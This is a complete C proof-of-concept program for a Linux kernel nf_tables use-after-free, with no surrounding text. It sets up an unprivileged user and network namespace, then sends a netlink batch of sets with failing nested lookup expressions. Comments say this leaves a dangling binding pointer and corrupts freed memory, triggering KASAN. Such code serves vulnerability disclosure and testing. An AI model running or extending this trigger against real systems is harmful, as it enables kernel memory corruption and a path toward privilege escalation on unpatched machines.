# POC Code

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <sched.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <err.h>
#include <libmnl/libmnl.h>
#include <libnftnl/chain.h>
#include <libnftnl/expr.h>
#include <libnftnl/rule.h>
#include <libnftnl/table.h>
#include <libnftnl/set.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>
#include <sched.h>
#include <sys/types.h>
#include <signal.h>
#include <net/if.h>
#include <asm/types.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <sys/socket.h>
#include <linux/ethtool.h>
#include <linux/sockios.h>
#include <sys/xattr.h>
#include <unistd.h>

// gcc poc.c -o poc -l mnl -l nftnl
// or static:
// gcc poc.c -o poc -static -L/usr/local/lib/ -l nftnl -l mnl
// ./poc

void
unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];

    unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    return;
}

void
netfilter()
{
    char * table_name = "table";
    char * set_name = NULL;
    uint8_t family = NFPROTO_IPV4;
    uint32_t set_id = 1;

    // a table for the sets to be associated with
    struct nftnl_table * table = nftnl_table_alloc();
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);
    nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);

    // expressions
    struct nftnl_expr * exprs[128];
    int exprid = 0;

    // sets
    struct nftnl_set * set_stable =  nftnl_set_alloc();
    struct nftnl_set * set_trigger =  nftnl_set_alloc();
    struct nftnl_set * set_uaf =  nftnl_set_alloc();

    // we need a set that we can look up with another expression
    set_name = "set_stable";
    nftnl_set_set_str(set_stable, NFTNL_SET_TABLE, table_name);
    nftnl_set_set_str(set_stable, NFTNL_SET_NAME, set_name);
    nftnl_set_set_u32(set_stable, NFTNL_SET_KEY_LEN, 1);
    nftnl_set_set_u32(set_stable, NFTNL_SET_FAMILY, family);
    nftnl_set_set_u32(set_stable, NFTNL_SET_ID, set_id++);

    // the set that will fail, due to a bad lookup expression, leaving a
    // dangling pointer on set->bindings
    set_name = "set_trigger";
    nftnl_set_set_str(set_trigger, NFTNL_SET_TABLE, table_name);
    nftnl_set_set_str(set_trigger, NFTNL_SET_NAME, set_name);
    nftnl_set_set_u32(set_trigger, NFTNL_SET_FLAGS, NFT_SET_EXPR);
    nftnl_set_set_u32(set_trigger, NFTNL_SET_KEY_LEN, 1);
    nftnl_set_set_u32(set_trigger, NFTNL_SET_FAMILY, family);
    nftnl_set_set_u32(set_trigger, NFTNL_SET_ID, set_id);
    exprs[exprid] = nftnl_expr_alloc("lookup");
    nftnl_expr_set_str(exprs[exprid], NFTNL_EXPR_LOOKUP_SET, "set_stable");
    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);
    // nest the expression into the set
    nftnl_set_add_expr(set_trigger, exprs[exprid]);
    exprid++;

    // trigger the buggy look up again (this just duplicates the above)
    // this set will also fail, and will write the address of the expression to
    // the free chunk, which will trigger kasan
    set_name = "set_uaf";
    nftnl_set_set_str(set_uaf, NFTNL_SET_TABLE, table_name);
    nftnl_set_set_str(set_uaf, NFTNL_SET_NAME, set_name);
    nftnl_set_set_u32(set_uaf, NFTNL_SET_FLAGS, NFT_SET_EXPR);
    nftnl_set_set_u32(set_uaf, NFTNL_SET_KEY_LEN, 1);
    nftnl_set_set_u32(set_uaf, NFTNL_SET_FAMILY, family);
    nftnl_set_set_u32(set_uaf, NFTNL_SET_ID, set_id);
    exprs[exprid] = nftnl_expr_alloc("lookup");
    nftnl_expr_set_str(exprs[exprid], NFTNL_EXPR_LOOKUP_SET, "set_stable");
    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);
    nftnl_set_add_expr(set_uaf, exprs[exprid]);
    exprid++;

    // serialize
    char buf[MNL_SOCKET_BUFFER_SIZE*2];

    struct mnl_nlmsg_batch * batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
    int seq = 0;

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    struct nlmsghdr * nlh;

    // add table
    nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
NFT_MSG_NEWTABLE, family, 0, seq++);
    nftnl_table_nlmsg_build_payload(nlh, table);
    mnl_nlmsg_batch_next(batch);

    // add set_stable
    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_NEWSET, family,
                                    NLM_F_CREATE|NLM_F_ACK, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set_stable);
    nftnl_set_free(set_stable);
    mnl_nlmsg_batch_next(batch);

    // add set_trigger
    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_NEWSET, family,
                                    NLM_F_CREATE|NLM_F_ACK, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set_trigger);
    nftnl_set_free(set_trigger);
    mnl_nlmsg_batch_next(batch);

    // add set_uaf
    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_NEWSET, family,
                                    NLM_F_CREATE|NLM_F_ACK, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set_uaf);
    nftnl_set_free(set_uaf);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    struct mnl_socket * nl = mnl_socket_open(NETLINK_NETFILTER);
    if (nl == NULL) {
        err(1, "mnl_socket_open");
    }

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }
    printf("should have triggered KASAN\n");
}

int
main(int argc, char ** argv)
{
    unshare_setup(getuid(), getgid());
    netfilter();
    return 0;
}
